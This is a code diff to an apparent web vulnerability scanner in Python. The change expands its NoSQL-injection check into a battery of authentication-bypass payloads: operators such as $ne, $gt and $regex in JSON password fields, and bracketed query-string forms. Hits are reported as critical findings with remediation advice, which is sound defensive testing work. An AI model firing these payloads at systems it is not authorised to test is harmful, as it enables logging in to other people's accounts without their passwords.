@@ -43,23 +43,49 @@ class AdvancedScanner:
     def _nosqli(self, base: str, endpoint: str) -> list[Finding]:
         out: list[Finding] = []
         hdr = {"Content-Type": "application/json"}
-        inj = self.http.post(f"{base}{endpoint}", headers=hdr,
-                             content=json.dumps({"username": "admin", "password": {"$ne": None}}))
+
+        def ok(txt: str) -> bool:
+            t = txt.lower().replace(" ", "")
+            return '"success":true' in t or '"token"' in t or "welcome" in t or '"role"' in t
+
         wrong = self.http.post(f"{base}{endpoint}", headers=hdr,
                               content=json.dumps({"username": "admin", "password": "wrong_bz_xyz"}))
-        inj_ok = '"success": true' in inj.text.lower().replace(" ", " ") or '"success":true' in inj.text.lower() or "token" in inj.text.lower()
-        wrong_ok = '"success":true' in wrong.text.lower().replace(" ", "") or "token" in wrong.text.lower()
-        if inj_ok and not wrong_ok:
-            self.log.action(base, self.name, f"NoSQLi probe {endpoint}")
-            self._report(out, Finding(
-                title=f"NoSQL Injection (auth bypass) in {endpoint}",
-                severity=Severity.CRITICAL, owasp="A05:2025 Injection", cwe="CWE-943",
-                target=f"{base}{endpoint}", component=endpoint, source_tool=self.name,
-                description="A NoSQL operator ({\"$ne\": null}) in the password field bypasses authentication.",
-                impact="Logging in without knowing the password; access to any account.",
-                recommendation="Validate types (password must be a string); do not pass objects into queries.",
-                evidence=Evidence(payload='{"username":"admin","password":{"$ne":null}}',
-                                  response=inj.text[:200])))
+        if ok(wrong.text):
+            return out  # accepts any password → not a clean signal
+        # many NoSQL operator-injection shapes, JSON body AND query-string form
+        json_ops = [{"$ne": None}, {"$gt": ""}, {"$gte": ""}, {"$ne": "x"},
+                    {"$regex": ".*"}, {"$regex": "^a"}, {"$in": ["admin"]}, {"$exists": True}]
+        for op in json_ops:
+            inj = self.http.post(f"{base}{endpoint}", headers=hdr,
+                                content=json.dumps({"username": "admin", "password": op}))
+            if ok(inj.text):
+                self.log.action(base, self.name, f"NoSQLi probe {endpoint}")
+                self._report(out, Finding(
+                    title=f"NoSQL Injection (auth bypass) in {endpoint}",
+                    severity=Severity.CRITICAL, owasp="A05:2025 Injection", cwe="CWE-943",
+                    target=f"{base}{endpoint}", component=endpoint, source_tool=self.name,
+                    description=f"A NoSQL operator ({json.dumps(op)}) in the password field bypasses authentication.",
+                    impact="Logging in without knowing the password; access to any account.",
+                    recommendation="Validate types (password must be a string); never pass objects into queries.",
+                    evidence=Evidence(payload=json.dumps({"username": "admin", "password": op}),
+                                      response=inj.text[:200])))
+                return out
+        # query-string operator injection (?username[$ne]=&password[$ne]=)
+        for qs in ["username[$ne]=x&password[$ne]=x", "username[$gt]=&password[$gt]=",
+                   "username[$regex]=.*&password[$regex]=.*"]:
+            inj = self.http.post(f"{base}{endpoint}",
+                                headers={"Content-Type": "application/x-www-form-urlencoded"}, content=qs)
+            if ok(inj.text):
+                self.log.action(base, self.name, f"NoSQLi query-string probe {endpoint}")
+                self._report(out, Finding(
+                    title=f"NoSQL Injection (query-string operators) in {endpoint}",
+                    severity=Severity.CRITICAL, owasp="A05:2025 Injection", cwe="CWE-943",
+                    target=f"{base}{endpoint}", component=endpoint, source_tool=self.name,
+                    description=f"Query-string operator injection ({qs}) bypasses authentication.",
+                    impact="Authentication bypass without a valid password.",
+                    recommendation="Reject bracket/operator params; validate types server-side.",
+                    evidence=Evidence(payload=qs, response=inj.text[:200])))
+                return out
         return out
 
     def _stored_xss(self, base: str, write: str, read: str, field: str) -> list[Finding]:
